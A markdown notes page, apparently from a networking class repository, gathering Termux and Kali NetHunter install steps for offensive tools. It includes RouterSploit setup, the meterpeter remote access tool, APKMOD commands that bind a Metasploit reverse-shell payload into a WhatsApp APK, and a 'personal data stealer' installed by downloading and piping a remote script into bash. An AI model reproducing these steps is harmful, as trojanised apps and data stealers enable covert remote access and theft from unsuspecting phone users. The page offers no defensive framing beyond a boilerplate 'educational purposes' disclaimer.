### Install nethunter
* [kali NetHunter](https://www.kali.org/docs/nethunter/installing-nethunter/?fbclid=IwAR3ghqFZmYRjh3sLw5WNzqegpTMIJ4nYAeWtZhdmjwMjo_ZPUx6yNHJ3o-I)
```
Installing NetHunter requires the following steps:
- Download a pre-built image or build your own image
- Put your device in developer mode
- Unlock your device
- Install TWRP
- Flash Magisk
- Android 9 and above: Format “data” and flash Universal DM-Verity & ForceEncrypt Disabler
- Install NetHunter
- Android 10 and above: Update NetHunter App from the NetHunter Store
- Run the NetHunter App to finish the installation
```
### Termux software install
* pkg update
* pkg upgrade
### Banner
```
"Want to add a custom banner to your Termux terminal?
Check out the Evil Eye script created by Bhai4You on GitHub. This script will install multiple packages like figlet, toilet, cow say, nano, ruby, local cat and use them to display the Evil Eye banner in Termux.
Follow these steps:
1) pkg install git -y
2) git clone https://github.com/Bhai4You/Termux-Banner
3) cd Termux-Banner
4) chmod +x *
5) bash requirement.sh
6) bash t-ban.sh
7) Type your banner name.
Perfect for tutorials and fun!
```
### routersploit on termux 
#### As you know routersploit on termux there are always problems i found the solution for routersploit on termux again
```
#!/bin/bash
echo "=================="
echo "Bash script for routersploit installation on termux"
echo "Keep your phone alive and try not to use it while installing"
echo "=================="
sleep 3
apt update -y && apt upgrade -y
apt install autoconf automake bison bzip2 clang cmake coreutils diffutils flex gawk git grep gzip libtool make patch perl sed silversearcher-ag tar wget pkg-config python clang libcrypt libffi git openssl libsodium -y
python -m pip install wheel
SODIUM_INSTALL=system pip install pynacl
git clone https://github.com/threat9/routersploit
mv routersploit $HOME/
pip install -r requirements.txt
pip install -r requirements-dev.txt
echo "Done!"
```
##
```
cd routersploit
apt install python-cryptography
apt install python-bcrypt
pip install -r requirements.txt
pip install colorama
pip3 install setuptools
export SODIUM_INSTALL=system
pip3 install --no-binary :all: pynacl
pip install routersploit
python rsf.py
```
* ![routerspolit](https://github.com/jumbokh/Network-class/blob/main/images/routerspolit.jpg)
####
#### Debug -- bcrypt
```
A possible workaround (for experts). Get source and apply the following patch:

--- a/src/_bcrypt/Cargo.toml
+++ b/src/_bcrypt/Cargo.toml
@@ -20,5 +20,5 @@
 crate-type = ["cdylib"]
 
 [profile.release]
-lto = "thin"
+#lto = "thin"
 overflow-checks = true
And then in the source directory

pip install .
```
##
```
cryptography is available as a Termux package named python-cryptography. bcrypt will soon become available as python-bcrypt.
==>
export CARGO_BUILD_TARGET=aarch64-linux-android && pip install cryptography
==> python-bcrypt
```
##
### codename: Zaratustra  -- Remote Access Tool v2.10.13
* https://github.com/r00t-3xp10it/meterpeter
* https://github.com/r00t-3xp10it/meterpeter/releases/tag/v2.10.13?fbclid=IwAR1x6fnvnOpvoSuBJd0hvIKGxzBs8tw9iFAwpMglOlohUaCBQnf5H48QHPc
#### Install on Linux
```
https://github.com/r00t-3xp10it/meterpeter/blob/master/README.md#attacker-machine-linux-kali
```
##
#### Bind apk metasploit
* https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh?fbclid=IwAR15wlxfGnVR-dPgHwpe2BaveBsTt7ZGKdJqRDR--VQUq9x0S5-o3GtJZEY
```
Bind Metasploit Payload With App In Termux
Install APKMOD:
cd $HOME
pkg install wget
wget https://raw.githubusercontent.com/....../master/setup.sh
bash setup.sh
apkmod
Command:
apkmod -b -i original.apk -o binded.apk lhost=yourLhostHere lport=yourLportHere
apkmod -b -i /sdcard/Whatsapp.apk -o mybindedapp.apk lhost=127.0.0.1 lport=4444
```
##
#### PentestBox
* https://github.com/B4rC0d/PentestBox.git
```
This Tool is a Collection of Penetration Testing and Information Gathering Tools For Termux 🔰
Description : This script Aio Web Hacking & Information Gathering Included Admin Panel & Robots File Scanner & Whois And more ... You can use on Termux , Linux(Kali Linux)
☢️ Feature :
    ~> Admin Page Finder
    ~> DNS Lookup
    ~> Robots Scanner
    ~> Find Shared DNS
    ~> Show HTTP Header
    ~> IP location Finder
    ~> Port Scan
    ~> Whois
    ~> decode (Hash Crack)
    ~> encode
🔴 Installation  :-
$  apt update && apt upgrade -y
$  apt install git -y
$  apt install python3 -y
$  apt install python3-pip -y
$  git clone https://github.com/B4rC0d/PentestBox.git 
$  cd PentestBox
$  pip3 install -r requirements.txt 
$  python3 PentestBox.py
```
##
* https://github.com/Bhai4You/Shikari
```
shikari, Personal Data Stealer Termux Tool.
Installation
$ pip install shikari
or
$ wget https://raw.githubusercontent.com/....../shikari.sh;bash shikari.sh
Note:- This tool is only for educational purposes. We are not responsible for any misuse or illegal activities.
```
